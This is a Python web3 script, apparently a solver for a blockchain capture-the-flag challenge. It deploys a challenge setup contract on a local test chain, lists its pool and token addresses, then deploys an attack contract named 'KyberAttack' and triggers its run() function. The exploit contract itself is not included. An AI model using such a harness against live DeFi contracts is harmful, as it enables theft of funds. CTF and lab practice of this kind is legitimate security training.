import solcx

from solcx import compile_files
from web3 import Web3,HTTPProvider
from hexbytes import *
from eth_account.messages  import encode_defunct
def generate_tx(chainID, to, data, value):
    # print(web3.eth.gasPrice)
    # print(web3.eth.getTransactionCount(Web3.toChecksumAddress(account_address)))
    txn = {
        'chainId': chainID,
        'from': Web3.to_checksum_address(account_address),
        'to': to,
        'gasPrice': web3.eth.gas_price,
        'gas': 67219700,
        'nonce': web3.eth.get_transaction_count(Web3.to_checksum_address(account_address)) ,
        'value': Web3.to_wei(value, 'ether'),
        'data': data,
    }
    # print(txn)
    return txn

def sign_and_send(txn):
    signed_txn = web3.eth.account.sign_transaction(txn, private_key)
    txn_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction).hex()
    txn_receipt = web3.eth.wait_for_transaction_receipt(txn_hash)
    # print("txn_hash=", txn_hash)
    return txn_receipt


def deploy(FileName,ContractName,Compileversion):
    compiled_sol = compile_files(["xxx".replace("xxx",FileName)],output_values=["abi", "bin"],solc_version=Compileversion)
    data = compiled_sol['xxx:nnn'.replace("xxx",FileName).replace("nnn",ContractName)]['bin']
    # print(data)
    txn = generate_tx(chain_id, '', data, 0)
    txn_receipt = sign_and_send(txn)

    attack_abi = compiled_sol['xxx:nnn'.replace("xxx",FileName).replace("nnn",ContractName)]['abi']
    if txn_receipt['status'] == 1:
        attack_address = txn_receipt['contractAddress']
        return attack_address,attack_abi
    else:
        exit(0)

if __name__ == '__main__':
    chain_id = 31337
    # solcx.install_solc("0.8.9")
    # web3 = Web3(HTTPProvider( "http://1.95.36.186:8545" ))
    web3 = Web3(HTTPProvider( "http://127.0.0.1:7545" ))
    private_key = 'xxxx'
    # 
    acct = web3.eth.account.from_key(private_key)
    account_address = acct.address
    print(account_address)
    print(web3.eth.get_balance(account_address))
    #
    # # #
    target_address, target_abi = deploy("contracts/Setup.sol","Setup","0.8.9")
    print("[+] 题目setup地址 " + target_address)


    # ca#
    target_address_instance = web3.eth.contract(address=target_address, abi=target_abi)
    print("[+] 题目setup函数 ")
    print(target_address_instance.all_functions())


    # pool()
    print("[+] pool address " + target_address_instance.functions.pool().call())
    print("[+] token0 address " + str(target_address_instance.functions.token0().call()))
    print("[+] token1 address " + str(target_address_instance.functions.token1().call()))
    print("[+] factory address " + target_address_instance.functions.factory().call())


    attack_address, attack_abi = deploy("exp/exp.sol", "KyberAttack", "0.8.9")
    print("[+] 攻击合约地址 " + attack_address)
    # # #
    attack_address_instance = web3.eth.contract(address=attack_address, abi=attack_abi)
    print("[+] 攻击合约函数 ")

    calldata = web3.keccak(text="run()").hex()[:10]
    print(calldata)
    intialize = generate_tx(chain_id, attack_address,calldata,0)
    okk = sign_and_send(intialize)
    print(okk['status'])

